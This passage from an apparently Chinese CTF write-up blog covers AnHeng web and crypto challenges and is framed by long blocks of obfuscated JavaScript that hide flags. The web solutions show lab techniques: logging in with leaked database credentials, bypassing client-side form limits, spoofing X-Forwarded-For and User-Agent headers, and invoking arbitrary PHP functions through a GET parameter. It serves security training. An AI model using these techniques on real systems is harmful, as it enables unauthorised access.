(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (<span class="string">'_'</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>明显是一段颜文字，直接在控制台解码</p>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">window[<span class="string">'flag'</span>] = <span class="string">'Flag&#123;6b4807273afdffc4426b790debcd2b96&#125;'</span>;</span><br><span class="line">console.log(<span class="string">"Flag&#123; hahahah wrong!! :(&#125;"</span>);</span><br></pre></td></tr></table></figure>
<h2 id="愤怒的管理员"><a href="#愤怒的管理员" class="headerlink" title="愤怒的管理员"></a>愤怒的管理员</h2><p>只有一句话Success in database connection!<br>查看robots.txt文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /include</span><br><span class="line">Disallow: /dbadmin</span><br></pre></td></tr></table></figure>
<p>分别查看这两个目录<br>在/include目录下有个db.phps链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define ( <span class="string">'Z_DB_NAME'</span>, <span class="string">'dbappweb1'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_USER'</span>, <span class="string">'dbappweb1_IJebj'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_PASSWORD'</span>, <span class="string">'dspnwU5WY4NuArxh'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_HOST'</span>, <span class="string">'localhost'</span> );</span><br><span class="line">define ( <span class="string">'Z_DB_CHARSET'</span>, <span class="string">'utf8'</span> );</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">'z_'</span>;</span><br></pre></td></tr></table></figure>
<p>看样子是一个数据库的登录名和登陆密码<br>进入/dbadmin目录<br>有一个登录框，刚好就用/include目录下的那个登陆信息尝试登陆，成功登陆<br>进入后似乎是一个数据库管理系统，在左侧有一列目录，在其中的flags目录中发现了<br>flag{7e01c19b66330b121c90f6ebcafe8231}</p>
<h2 id="你就是长不了"><a href="#你就是长不了" class="headerlink" title="你就是长不了"></a>你就是长不了</h2><p>给了一个输入框，要求输入长度大于10的字符串，结果最多只能输10位，查看源代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">"form-group"</span>&gt;</span><br><span class="line">	&lt;label&gt;又有输入框咯，但是，你能提交长于10个字符的内容么？&lt;/label&gt;</span><br><span class="line">	&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> class=<span class="string">"form-control"</span> name=<span class="string">"post"</span> maxlength=<span class="string">"10"</span>&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>将maxlength修改为大于10的值即可<br>flag{88c48ff4b554eca6c7f961490aea8373}</p>
<h2 id="你就是提交不了"><a href="#你就是提交不了" class="headerlink" title="你就是提交不了"></a>你就是提交不了</h2><p>一个输入框，一个提交按钮，输入框不可输入，提交按钮也不可点击，查看源代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;form role=<span class="string">"form"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">	&lt;div class=<span class="string">"form-group"</span>&gt;</span><br><span class="line">		&lt;label&gt;提交He110w0r1d就能获得flag啦,够简单吧！&lt;/label&gt;</span><br><span class="line">		&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> class=<span class="string">"form-control"</span> name=<span class="string">"post"</span> disabled=<span class="string">"disabled"</span>&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;button <span class="built_in">type</span>=<span class="string">"submit"</span> class=<span class="string">"btn btn-default"</span> disabled=<span class="string">"disabled"</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>删除输入框和提交按钮的disable属性即可<br>flag{b0b237b92155c5ba0e0d90b1d01d8798}</p>
<h2 id="我的生日"><a href="#我的生日" class="headerlink" title="我的生日"></a>我的生日</h2><p>页面上有张哆啦A梦的照片，一个要求输入生日的输入框，一个输入验证码的输入框，百度哆啦A梦生日21120903<br>输入后拿到flag{6eabe3caaeccb77310b47e397bada813}</p>
<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>在源代码中发现了一段js代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check</span></span>()&#123;</span><br><span class="line">        var flag = document.getElementById(<span class="string">"flag"</span>).value;</span><br><span class="line">        var str = <span class="string">"d84d9657e5e5e"</span> || 0;</span><br><span class="line">        var str = str + (<span class="string">"ad2ad3fe"</span> &amp;&amp; 2);</span><br><span class="line">        var str = str + <span class="string">"a2da9494b8"</span> + <span class="string">"ddea4fd4"</span>;</span><br><span class="line">        var str = str.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (str == flag)&#123;</span><br><span class="line">            alert(<span class="string">"恭喜你已经找到flag！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>分析这段代码，先从输入框拿到一个输入的字符串。对str进行操作，最终如果输入的字符串flag和str处理完后的结果一样的话，就会弹出   恭喜你已经找到flag！<br>那么只要得到str处理的最终结果，即就是flag<br>js在线运行：<a href="https://www.sojson.com/runjs.html" target="_blank" rel="noopener">https://www.sojson.com/runjs.html</a><br>不过处理完了需要把str显示出来，加一句输出语句即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var str = <span class="string">"d84d9657e5e5e"</span> || 0;</span><br><span class="line">var str = str + (<span class="string">"ad2ad3fe"</span> &amp;&amp; 2);</span><br><span class="line">var str = str + <span class="string">"a2da9494b8"</span> + <span class="string">"ddea4fd4"</span>;</span><br><span class="line">var str = str.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">document.write(str)</span><br></pre></td></tr></table></figure>
<p>运行结果是4df4aedd8b4949ad2a2e5e5e7569d48d</p>
<h2 id="刀塔"><a href="#刀塔" class="headerlink" title="刀塔"></a>刀塔</h2><p>用御剑后台扫描，出现了一个<a href="http://www.zip文件，打开后在flag.php中发现了" target="_blank" rel="noopener">www.zip文件，打开后在flag.php中发现了</a><br>flag:{ef167fd977019c10e6aa761a419c5240} </p>
<h2 id="100块钱都不给我"><a href="#100块钱都不给我" class="headerlink" title="100块钱都不给我"></a>100块钱都不给我</h2><p>第一眼看到满屏幕字母很懵，这都啥玩意儿。看源代码，什么也没有发现<br>查看robots.txt协议，眼前一亮，啊哈</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /index.php1</span><br></pre></td></tr></table></figure>
<p>查看index.php1,有一段php代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = isset(<span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) ? <span class="variable">$_GET</span>[<span class="string">'ctf'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>( function_exists(<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="variable">$a</span>();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">print</span> &lt;&lt;&lt;DBAPP</span><br></pre></td></tr></table></figure>
<p>构造?ctf=phpinfo<br>拿到flag{fc4e4034aafc11936d9a099c1867a355}</p>
<h2 id="又是空白页"><a href="#又是空白页" class="headerlink" title="又是空白页"></a>又是空白页</h2><p>burpsuite抓包，修改X-Forwarded-For:127.0.0.1,拿到 flag{96a2dd4632fffcefb6226a3b56017f0b}</p>
<h2 id="iphone5"><a href="#iphone5" class="headerlink" title="iphone5"></a>iphone5</h2><p>题目叙述：屌丝没有苹果，手机都买不起，咋办？室友的iphone6好眼馋，某些网站也只有手机打得开(答案为flag{}形式，提交{}中内容即可)<br>，题目意思是要用苹果的浏览器来访问这个网页，burpsuite抓包修改UA为ios6的代理<br>ios6的UA：Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25<br>拿到flag{a2a7c20140d7520903a70e4d282870df}</p>
<h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>题目叙述：某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。<br>wireshark打开后，把http过滤出来，追踪tcp流</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=admina&amp;word=adminb</span><br></pre></td></tr></table></figure>
<p>账号为admina,密码为adminb<br>对adminaadminb进行md5加密，1d240aafe21a86afc11f38a45b541a49</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>AnHeng-Crypto</title>
    <url>/2020/01/11/AnHeng-Crypto/</url>
    <content><![CDATA[<h2 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h2><p>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=<br>明显是base64，直接解码flag{THE_FLAG_OF_THIS_STRING}</p>
<h2 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h2><p>题目叙述：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。<br>质因数分解：<a href="http://www.atool9.com/quality_factor.php" target="_blank" rel="noopener">http://www.atool9.com/quality_factor.php</a><br>分解后为：101999*966233<br>只需得到md5(101999966233)即可d450209323a847c8d01c6be47c81811a</p>
<a id="more"></a>
<h2 id="其实很简单"><a href="#其实很简单" class="headerlink" title="其实很简单"></a>其实很简单</h2><p>题目叙述：在学习了凯撒大帝使用的神奇密码后，密码前辈们有创造出了更为奇异的加密方法。本题出题者喜欢用helloworld当密钥，密文如下：dlpcsegkshrij,请破解后提交。附录是一张似乎有用的表。答案为非常规形式。<br>从图片看应该是维吉尼亚密码，key=helloworld,解密后为whereisthekey</p>
<h2 id="大帝的秘密武器"><a href="#大帝的秘密武器" class="headerlink" title="大帝的秘密武器"></a>大帝的秘密武器</h2><p>题目叙述：公元前一百年，在罗马处上了一位对世界影响巨大的人物，他是当时罗马三巨头之一。在执政生涯中，传言他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。以下密文被解开后可以获得一个有意义的单词，你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交：FRPHEVGL。答案为非常规形式。<br>根据题目描述可以看出是凯撒加密，当位移量为13时，解密为SECURITY，待加密的明文为ComeChina，加密后为PbzrPuvan</p>
<h2 id="这是什么"><a href="#这是什么" class="headerlink" title="这是什么"></a>这是什么</h2><p>题目叙述：小明是一个软件专业的高材生，但是老师布置的这次的作业似乎不怎么靠谱，因为他们老师以前是学物理的！喜欢乱七八糟命名文件，还喜欢奇奇怪怪的编码。你快帮小明看一下这题，小明准备好了一箱子辣条。<br>给了一个apk文件，用winhex打开，在里面发现了Microsoft Office Word 97-2003等字样，就试着把扩展名改为doc，成功打开了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(![]+[])[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(+(+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[+[]]+[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]